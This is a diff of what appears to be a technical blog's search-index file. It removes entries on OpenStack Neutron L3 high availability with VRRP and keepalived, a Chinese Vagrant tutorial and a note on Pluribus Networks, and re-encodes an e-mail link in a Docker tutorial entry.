-<li><a href="https://docs.google.com/document/d/1depasJSnGZPOnRLxEC_PYsVLcGVFXZLqP52RFTe21BE/" target="_blank" rel="external">https://docs.google.com/document/d/1depasJSnGZPOnRLxEC_PYsVLcGVFXZLqP52RFTe21BE/</a></li>
-</ul>
-<p>The gist is that it moves routing to the compute nodes, rendering the L3 agent on the network nodes pointless. Or does it?</p>
-<ul>
-<li>DVR handles only floating IPs, leaving SNAT to the L3 agents on the network nodes</li>
-<li>Doesn’t work with VLANs, only works with <a href="http://assafmuller.wordpress.com/2013/10/14/gre-tunnels-in-openstack-neutron/" title="GRE Tunnels in OpenStack Neutron" target="_blank" rel="external">tunnels</a> and <a href="http://assafmuller.wordpress.com/2014/02/23/ml2-address-population/" title="ML2 – Address Population" target="_blank" rel="external">L2pop</a> enabled</li>
-<li>Requires external connectivity on every compute node</li>
-<li>Generally speaking, is a significant departure from Havana or Icehouse Neutron based clouds, while L3 HA is a simpler change to make for your deployment</li>
-</ul>
-<p>Ideally you would use DVR together with L3 HA. Floating IP traffic would be routed directly by your compute nodes, while SNAT traffic would go through the HA L3 agents on the network nodes.</p>
-<p><strong>Layer 3 High Availability</strong></p>
-<p>The Juno targeted L3 HA solution uses the popular Linux keepalived tool, which uses VRRP internally. First, then, let’s discuss VRRP.</p>
-<p><strong>What is VRRP, how does it work in the physical world?</strong></p>
-<p>Virtual Router Redundancy Protocol is a<a href="http://en.wikipedia.org/wiki/First-hop_redundancy_protocols" target="_blank" rel="external"> first hop redundancy protocol</a>&nbsp;– It aims to provide high availability of the network’s default gateway, or the next hop of a route. What problem does it solve? In a network topology with two routers providing internet connectivity, you could assign half of the network’s default gateway to the first router’s IP address, and the other half to the second router.</p>
-<p><img src="http://assafmuller.files.wordpress.com/2014/08/router_ha_topology_before_vrrp.png?w=696" alt="router_ha_topology_before_vrrp"></p>
-<p>This would provide load sharing, but what happens if one router loses connectivity? Herein comes the idea of a virtual IP address, or a floating address, which will be configured as the network’s default gateway. During a failover, the standby routers won’t receive VRRP hello messages from the master and will thus perform an election process, with the winning router acting as the active gateway, and the others remain as standby. The active router configures the virtual IP address (Or VIP for short), on its internal, LAN facing interface, and responds to ARP requests with a virtual MAC address. The network computers already have entries in their ARP caches (For the VIP + virtual MAC address) and have no reason to resend an ARP request. Following the election process, the virtuous standby router becomes the new active instance, and sends a gratuitous ARP request – Proclaiming to the network that the VIP + MAC pair now belong to it. The switches comprising the network move the virtual MAC address from the old port to the new.</p>
-<p><a href="https://assafmuller.files.wordpress.com/2014/08/switch_moves_mac.png" target="_blank" rel="external"><img src="http://assafmuller.files.wordpress.com/2014/08/switch_moves_mac.png?w=696" alt="switch_moves_mac"></a></p>
-<p>By doing so, traffic to the default gateway will reach the correct (New) active router. Note that this approach does not accomplish load sharing, in the sense that all traffic is forwarded through the active router. (Note that in the Neutron use case, load sharing is not accomplished at the individual router level, but at the node level, assuming a non-trivial amount of routers). How does one accomplish load sharing at the router resolution? VRRP groups: The VRRP header includes a Virtual Router Identifier, or VRID. Half of the network hosts will configure the first VIP, and the other half the second. In the case of a failure, the VIP previously found on the failing router will transfer to another one.</p>
-<p><a href="https://assafmuller.files.wordpress.com/2014/08/router_ha_two_vrrp_groups.png" target="_blank" rel="external"><img src="http://assafmuller.files.wordpress.com/2014/08/router_ha_two_vrrp_groups.png?w=696&amp;h=945" alt="router_ha_two_vrrp_groups"></a></p>
-<p>The observant reader will have identified a problem – What if the active router loses connectivity to the internet? Will it remain as the active router, unable to route packets? VRRP adds the capability to monitor the external link and relinquish its role as the active router in case of a failure.<a href="https://assafmuller.files.wordpress.com/2014/08/router_ha_external_trap.png" target="_blank" rel="external"><img src="http://assafmuller.files.wordpress.com/2014/08/router_ha_external_trap.png?w=696" alt="router_ha_external_trap"></a></p>
-<p>Note: As far as IP addressing goes, it’s possible to operate in two modes:</p>
-<ol>
-<li>Each router gets an IP address, regardless of its VRRP state. The master router is configured with the VIP as an additional &nbsp;or secondary address.</li>
-<li>Only the VIP is configured. IE: The master router will hold the VIP while the slaves will have no IPs configured whatsoever.</li>
-</ol>
-<p><strong>VRRP – The Dry Facts</strong></p>
-<ul>
-<li>Encapsulated directly in the IP protocol</li>
-<li>Active instance uses multicast address 224.0.0.18, MAC&nbsp;01-00-5E-00-00-12 when sending hello messages to its standby routers</li>
-<li>The virtual MAC address is of the form:&nbsp;00-00-5E-00-01-{VRID}, thus only 256 different VRIDs (0 to 255) can exist in a single broadcast domain</li>
-<li>The election process uses a user configurable priority, from 1 to 255, the higher the better</li>
-<li>Preemptive elections, like in other network protocols, means that if a standby is configured with a higher priority, or comes back after losing its connectivity (And previously acting as the active instance) it will resume its role as the active router</li>
-<li>Non-preemptive elections mean that when an active router loses its connectivity and comes back up, it will remain in a standby role</li>
-<li>The hello internal is configurable (Say: Every T seconds), and standby routers perform an election process if they haven’t received a hello message from the master after 3T seconds</li>
-</ul>
-<p><strong>Back to Neutron-land</strong></p>
-<p>L3 HA starts a keepalived instance in every router namespace. The different router instances talk to one another via a dedicated HA network, one per tenant. This network is created under the blank tenant to hide it from the CLI and GUI. The HA network is a &nbsp;Neutron tenant network, same as every other network, and uses the default segmentation technology. HA routers have an ‘HA’ device in their namespace: When a HA router is created, it is scheduled to a number of network nodes, along with a port per network node, belonging to the tenant’s HA network. keepalived traffic is forwarded through the HA device (As specified in the <span class="skimlinks-unlinked">keepalived.conf</span> file used by the keepalived instance in the router namespace). Here’s the output of ‘ip address’ in the router namespace:</p>
-<pre>
-[stack@vpn-6-88 ~]$ sudo ip netns exec qrouter-b30064f9-414e-4c98-ab42-646197c74020 ip address
-1: lo: <loopback,up,lower_up> mtu 65536 qdisc noqueue state UNKNOWN group default 
-    ...
-2794: **ha-45249562-ec**: <broadcast,multicast,up,lower_up> mtu 1500 qdisc noqueue state UNKNOWN group default 
-    link/ether 12:34:56:78:2b:5d brd ff:ff:ff:ff:ff:ff
-    inet 169.254.0.2/24 brd 169.254.0.255 scope global ha-54b92d86-4f
-       valid_lft forever preferred_lft forever
-    inet6 fe80::1034:56ff:fe78:2b5d/64 scope link 
-       valid_lft forever preferred_lft forever
-2795: qr-dc9d93c6-e2: <broadcast,multicast,up,lower_up> mtu 1500 qdisc noqueue state UNKNOWN group default 
-    link/ether ca:fe:de:ad:be:ef brd ff:ff:ff:ff:ff:ff
-    inet 10.0.0.1/24 scope global qr-0d51eced-0f
-       valid_lft forever preferred_lft forever
-    inet6 fe80::c8fe:deff:fead:beef/64 scope link 
-       valid_lft forever preferred_lft forever
-2796: qg-843de7e6-8f: <broadcast,multicast,up,lower_up> mtu 1500 qdisc noqueue state UNKNOWN group default 
-    link/ether ca:fe:de:ad:be:ef brd ff:ff:ff:ff:ff:ff
-    inet 19.4.4.4/24 scope global qg-75688938-8d
-       valid_lft forever preferred_lft forever
-    inet6 fe80::c8fe:deff:fead:beef/64 scope link 
-       valid_lft forever preferred_lft forever
-</broadcast,multicast,up,lower_up></broadcast,multicast,up,lower_up></broadcast,multicast,up,lower_up></loopback,up,lower_up></pre>
-
-<p>That is the output for the master instance. The same router on another node would have no IP address on the ha, qr, or qg devices. It would have no floating IPs or routing entries. These are persisted as configuration values in <span class="skimlinks-unlinked">keepalived.conf</span>, and when keepalived detects the master instance failing, these addresses (Or: VIPs) are configured by keepalived on the appropriate devices. Here’s an example of <span class="skimlinks-unlinked">keepalived.conf</span>, for the same router shown above:</p>
-<pre>
-vrrp_sync_group VG_1 {
-    group {
-        VR_1
-    }
-    notify_backup "/path/to/<span class="skimlinks-unlinked">notify_backup.sh</span>"
-    notify_master "/path/to/<span class="skimlinks-unlinked">notify_master.sh</span>"
-    notify_fault "/path/to/<span class="skimlinks-unlinked">notify_fault.sh</span>"
-}
-vrrp_instance VR_1 {
-    state BACKUP
-    interface ha-45249562-ec
-    virtual_router_id 1
-    priority 50
-    nopreempt
-    advert_int 2
-    track_interface {
-        ha-45249562-ec
-    }
-    virtual_ipaddress {
-        19.4.4.4/24 dev qg-843de7e6-8f
-    }
-    virtual_ipaddress_excluded {
-        10.0.0.1/24 dev qr-dc9d93c6-e2
-    }
-    virtual_routes {
-        0.0.0.0/0 via 19.4.4.1 dev qg-843de7e6-8f
-    }
-}
-</pre>
-
-<p>What are those notify scripts? These are scripts that keepalived executes upon transition to master, backup, or fault. Here’s the contents of the master script:</p>
-<pre>
-#!/usr/bin/env bash
-neutron-ns-metadata-proxy --pid_file=/tmp/tmpp_6Lcx/tmpllLzNs/external/pids/b30064f9-414e-4c98-ab42-646197c74020/pid --metadata_proxy_socket=/tmp/tmpp_6Lcx/tmpllLzNs/metadata_proxy --router_id=b30064f9-414e-4c98-ab42-646197c74020 --state_path=/opt/openstack/neutron --metadata_port=9697 --debug --verbose
-echo -n master > /tmp/tmpp_6Lcx/tmpllLzNs/ha_confs/b30064f9-414e-4c98-ab42-646197c74020/state
-</pre>
-
-<p>The master script simply opens up the metadata proxy, and writes the state to a state file, which can be later read by the L3 agent. The backup and fault scripts kill the proxy and write their respective states to the aforementioned state file. This means that the metadata proxy will be live only on the master router instance.</p>
-<p><strong>* Aren’t We Forgetting the Metadata Agent?</strong></p>
-<p>Simply enable the agent on every network node and you’re good to go.</p>
-<p><strong>Future Work &amp; Limitations</strong></p>
-<ul>
-<li>TCP connection tracking – With the current implementation, TCP sessions are broken on failover. The idea is to use conntrackd in order to replicate the session states across HA routers, so that when the failover finishes, TCP sessions will continue where they left off.</li>
-<li>Where is the master instance hosted? As it is now it is impossible for the admin to know which network node is hosting the master instance of a HA router. The plan is for the agents to report this information and for the server to expose it via the API.</li>
-<li>Evacuating an agent – Ideally bringing down a node for maintenance should cause all of the HA router instances on said node to relinquish their master states, speeding up the failover process.</li>
-<li>Notifying L2pop of VIP movements – Consider the IP/MAC of the router on a tenant network. Only the master instance will actually have the IP configured, but the same Neutron port and same MAC will show up on all participating network nodes. This might have adverse effects on the L2pop mechanism driver, as it expects a MAC address in a single location in the network. The plan to solve this deficiency is to send an RPC message from the agent whenever it detects a VRRP state change, so that when a router becomes the master, the controller is notified, which can then update the L2pop state.</li>
-<li>FW, VPN and LB as a service integration. Both DVR and L3 HA have issues integrating with the advanced services, and a more serious look will be taken during the Kilo cycle.</li>
-<li>One HA network per tenant. This implies a limit of 255 HA routers per tenant, as each router takes up a VRID, and the VRRP protocol allows 255 distinct VRID values in a single broadcast domain.</li>
-</ul>
-<p><strong>Usage &amp; Configuration</strong></p>
-<pre>
-<span class="skimlinks-unlinked">neutron.conf</span>:
-l3_ha = True
-max_l3_agents_per_router = 2
-min_l3_agents_per_router = 2
-</pre>
-
-<ul>
-<li>l3_ha = True means that all router creations will default to HA (And not legacy) routers. This is turned off by default.</li>
-<li>You can set the max to a number between min and the number of network nodes in your deployment. If you deploy 4 net nodes but set max to 2, only two l3 agents will be used per HA router (One master, one slave).</li>
-<li>min is used as a sanity check: If you have two network nodes and one goes out momentarily, any new routers created during that time period will fail as you need at least <min> L3 agents up when creating a HA router.</min></li>
-</ul>
-<p>l3_ha controls the default, while the CLI allows an admin (And only admins) to override that setting on a per router basis:</p>
-<pre>
-neutron router-create --ha=<true |="" false=""> router1
-</true></pre>
-]]></content>
-    </entry>
-    
-    <entry>
-      <title><![CDATA[vagrant]]></title>
-      <url>http://feisky.xyz/2015/01/26/vagrant/</url>
-      <content type="html"><![CDATA[<p>简易虚拟机管理工具vagrant</p>
-<h3 id="Vagrant简介"><a href="#Vagrant简介" class="headerlink" title="Vagrant简介"></a>Vagrant简介</h3><p>Vagrant是一款跨平台的虚拟机管理工具，可以用来封装跨平台的开发环境，分发给团队成员共享。</p>
-<h3 id="如何安装"><a href="#如何安装" class="headerlink" title="如何安装"></a>如何安装</h3><p>1.安装 VirtualBox</p>
-<p>Vagrant支持VMWare和VirtualBox，不过VMWare版本是收费的，简易使用VirtualBox版本。</p>
-<p>VirtualBox下载地址见<a href="http://www.virtualbox.org" target="_blank" rel="external">http://www.virtualbox.org</a></p>
-<p>2.安装 Vagrant</p>
-<p>下载Vagrant <a href="http://downloads.vagrantup.com/" target="_blank" rel="external">http://downloads.vagrantup.com/</a>，根据提示安装。</p>
-<p>首次使用可以下载官方封装好的基础镜像：<br>Ubuntu precise 32 VirtualBox <a href="http://files.vagrantup.com/precise32.box" target="_blank" rel="external">http://files.vagrantup.com/precise32.box</a><br>Ubuntu precise 64 VirtualBox <a href="http://files.vagrantup.com/precise64.box" target="_blank" rel="external">http://files.vagrantup.com/precise64.box</a></p>
-<p><a href="http://www.vagrantbox.es/" target="_blank" rel="external">http://www.vagrantbox.es/</a>提供了丰富的镜像资源，需要时可以去下载。</p>
-<p>3.添加镜像到 Vagrant</p>
-<p>假设我们下载的镜像存放路径是 ~/box/precise64.box，在终端里输入：</p>
-<figure class="highlight processing"><table><tr><td class="code"><pre><div class="line">$ vagrant <span class="built_in">box</span> <span class="built_in">add</span> ubuntu ~/<span class="built_in">box</span>/precise64.<span class="built_in">box</span></div></pre></td></tr></table></figure>
-<p>如果上一步没有下载镜像，可以在添加镜像的时候自动下载:</p>
-<figure class="highlight armasm"><table><tr><td class="code"><pre><div class="line">$ vagrant <span class="keyword">box </span><span class="keyword">add </span><span class="keyword">base </span>http://files.vagrantup.com/lucid32.<span class="keyword">box</span></div></pre></td></tr></table></figure>
-<p>4.创建虚拟机</p>
-<p>创建一个开发目录，用作虚拟机的工作目录，然后使用ubuntu这个镜像初始化虚拟机：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">$ <span class="built_in">cd</span> ~/dev  <span class="comment"># 切换目录</span></div><div class="line">$ vagrant init ubuntu  <span class="comment"># 初始化</span></div><div class="line">$ vagrant up  <span class="comment"># 启动虚拟机</span></div></pre></td></tr></table></figure>
-<p>启动完毕后就可以通过SSH登录了：</p>
-<figure class="highlight elixir"><table><tr><td class="code"><pre><div class="line"><span class="variable">$ </span>vagrant ssh  <span class="comment"># SSH 登录</span></div></pre></td></tr></table></figure>
-<p>注意如果机器上未安装ssh，则可以下载xshell、putty等工具连接，默认端口会自动映射到本机2222端口。</p>
-<p>5.配置文件</p>
-<p>Vagrant 初始化成功后，会在初始化的目录里生成一个 Vagrantfile 的配置文件，可以修改配置文件进行个性化的定制。如配置内网ip地址</p>
-<figure class="highlight css"><table><tr><td class="code"><pre><div class="line"><span class="selector-tag">config</span><span class="selector-class">.vm</span><span class="selector-class">.network</span> <span class="selector-pseudo">:private_network</span>, <span class="selector-tag">ip</span>: "192<span class="selector-class">.168</span><span class="selector-class">.33</span><span class="selector-class">.10</span>"</div></pre></td></tr></table></figure>
-<p>配置hostname，并将虚拟机的80端口映射到本机8080端口</p>
-<figure class="highlight stylus"><table><tr><td class="code"><pre><div class="line">config<span class="selector-class">.vm</span><span class="selector-class">.hostname</span> = <span class="string">"ubuntu"</span></div><div class="line">config<span class="selector-class">.vm</span><span class="selector-class">.network</span> :forwarded_port, guest: <span class="number">80</span>, host: <span class="number">8080</span></div></pre></td></tr></table></figure>
-<p>6.打包分发</p>
-<p>执行下面的语句，会在当前目录生成一个 package.box 的文件，将这个文件传给其他用户，其他用户只要添加这个 box就可以创建一个相同的虚拟机了：<br><figure class="highlight actionscript"><table><tr><td class="code"><pre><div class="line">$ vagrant <span class="class"><span class="keyword">package</span></span></div></pre></td></tr></table></figure></p>
-<p>7.常用命令</p>
-<figure class="highlight elixir"><table><tr><td class="code"><pre><div class="line"><span class="variable">$ </span>vagrant init  <span class="comment"># 初始化</span></div><div class="line"><span class="variable">$ </span>vagrant up  <span class="comment"># 启动虚拟机</span></div><div class="line"><span class="variable">$ </span>vagrant halt  <span class="comment"># 关闭虚拟机</span></div><div class="line"><span class="variable">$ </span>vagrant reload  <span class="comment"># 重启虚拟机</span></div><div class="line"><span class="variable">$ </span>vagrant ssh  <span class="comment"># SSH 至虚拟机</span></div><div class="line"><span class="variable">$ </span>vagrant status  <span class="comment"># 查看虚拟机运行状态</span></div><div class="line"><span class="variable">$ </span>vagrant destroy  <span class="comment"># 销毁当前虚拟机</span></div></pre></td></tr></table></figure>
-<p>8.注意事项</p>
-<p>使用 Apache/Nginx 时会出现诸如图片修改后但页面刷新仍然是旧文件的情况，是由于静态文件缓存造成的。需要对虚拟机里的 Apache/Nginx 配置文件进行修改：</p>
-<p>Apache 配置添加:</p>
-<p>EnableSendfile off</p>
-<p>Nginx 配置添加:</p>
-<p>sendfile off;</p>
-]]></content>
-    </entry>
-    
-    <entry>
-      <title><![CDATA[Pluribus Networks]]></title>
-      <url>http://feisky.xyz/2015/01/26/pluribus-networks/</url>
-      <content type="html"><![CDATA[<p>已经融资9500万美元的<a href="http://www.pluribusnetworks.com" target="_blank" rel="external">Pluribus</a>公司，做得Server Switch产品，其CEO说，既能克服Vmware产品的scalability, invisibility, performance问题，又能克服Cisco ACI的系统封闭性。说白了就是把网络做在服务器里面，但是网络处理发生在交换芯片而不是CPU里面，跟Facebook Wedge一样 @盛科张卫峰</p>
-]]></content>
-    </entry>
-    
-    <entry>
       <title><![CDATA[Docker]]></title>
       <url>http://feisky.xyz/2015/01/26/docker/</url>
       <content type="html"><![CDATA[<h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>Docker 是 dotCloud 最近几个月刚宣布的开源引擎，旨在提供一种应用程序的自动化部署解决方案，简单的说就是，在 Linux 系统上迅速创建一个容器（类似虚拟机）并在容器上部署和运行应用程序，并通过配置文件可以轻松实现应用程序的自动化安装、部署和升级，非常方便。因为使用了容器，所以可以很方便的把生产环境和开发环境分开，互不影响，这是 docker 最普遍的一个玩法。更多的玩法还有大规模 web 应用、数据库部署、持续部署、集群、测试环境、面向服务的云计算、虚拟桌面 VDI 等等。</p>
@@ -7458,7 +7458,7 @@ neutron router-create --ha=<true |="" false=""> router1
 <p><none>              <none>              e01000c7bac8        6 weeks ago         336.5 MB<br>centos              latest              b157b77b1a65        8 weeks ago         243.7 MB<br><figure class="highlight css"><table><tr><td class="code"><pre><div class="line"></div><div class="line">其中，镜像<span class="selector-tag">id</span>唯一标识了镜像，<span class="selector-tag">TAG</span>信息用来标记来自同一个仓库的不同镜像。例如<span class="selector-tag">ubuntu</span>仓库中有多个镜像，通过<span class="selector-tag">TAG</span>信息来区分发行版本，例如10<span class="selector-class">.04</span>、12<span class="selector-class">.04</span>、12<span class="selector-class">.10</span>、13<span class="selector-class">.04</span>、14<span class="selector-class">.04</span>等。创建容器时，如果不指定具体的标记，则默认使用<span class="selector-tag">latest</span>标记信息。</div><div class="line"></div><div class="line">除了从容器中下载已有镜像外，也可以根据已有镜像创建新的镜像。创建新镜像有多种方法：</div><div class="line"></div><div class="line">①修改已有镜像后<span class="selector-tag">commit</span></div></pre></td></tr></table></figure></none></none></p>
 <p>$ sudo docker run -t -i ubuntu:12.04 /bin/bash<br>root@a439b6e894bb:/# apt-get update<br>root@a439b6e894bb:/# apt-get install nginx<br>root@a439b6e894bb:/# /etc/init.d/nginx start<br>root@a439b6e894bb:/# exit<br>$ sudo docker commit -m ‘add ngnix’ -a ‘feisky’ a439b6e894bb ubuntu:nginx<br>0a693112c443ce4fb21bc57a26d67f0648b9415e052f929be7e06701f5f3ca2d<br>$ sudo docker images<br>REPOSITORY                               TAG                 IMAGE ID            CREATED             VIRTUAL SIZE<br>ubuntu                                   nginx               0a693112c443        9 seconds ago       153.1 MB<br>ubuntu                                   12.04               0a51fcc173d8        2 days ago          111 MB<br><figure class="highlight"><table><tr><td class="code"><pre><div class="line"></div><div class="line">②用dockerfile来创建镜像</div><div class="line"></div><div class="line">首先创建一个Dockerfile：</div></pre></td></tr></table></figure></p>
 <p>$ cat Dockerfile </p>
-<h1 id="yet-another-ngnix"><a href="#yet-another-ngnix" class="headerlink" title="yet another ngnix"></a>yet another ngnix</h1><p>FROM ubuntu:12.04<br>MAINTAINER feisky <a href="&#109;&#x61;&#105;&#x6c;&#116;&#111;&#58;&#x66;&#101;&#105;&#115;&#107;&#x79;&#x40;&#x72;&#x6f;&#x6f;&#x74;">&#x66;&#101;&#105;&#115;&#107;&#x79;&#x40;&#x72;&#x6f;&#x6f;&#x74;</a><br>RUN apt-get update<br>RUN apt-get -y install nginx</p>
+<h1 id="yet-another-ngnix"><a href="#yet-another-ngnix" class="headerlink" title="yet another ngnix"></a>yet another ngnix</h1><p>FROM ubuntu:12.04<br>MAINTAINER feisky <a href="&#x6d;&#97;&#x69;&#x6c;&#116;&#x6f;&#58;&#102;&#x65;&#x69;&#x73;&#x6b;&#121;&#x40;&#x72;&#111;&#x6f;&#x74;">&#102;&#x65;&#x69;&#x73;&#x6b;&#121;&#x40;&#x72;&#111;&#x6f;&#x74;</a><br>RUN apt-get update<br>RUN apt-get -y install nginx</p>
 <h1 id="put-my-local-site-to-var-www"><a href="#put-my-local-site-to-var-www" class="headerlink" title="put my local site to /var/www"></a>put my local site to /var/www</h1><p>ADD index.html /var/www/html/</p>
 <h1 id="expose-httpd-port"><a href="#expose-httpd-port" class="headerlink" title="expose httpd port"></a>expose httpd port</h1><p>EXPOSE 80</p>
 <h1 id="the-command-to-run"><a href="#the-command-to-run" class="headerlink" title="the command to run"></a>the command to run</h1><p>CMD [“/usr/sbin/nginx”]</p>
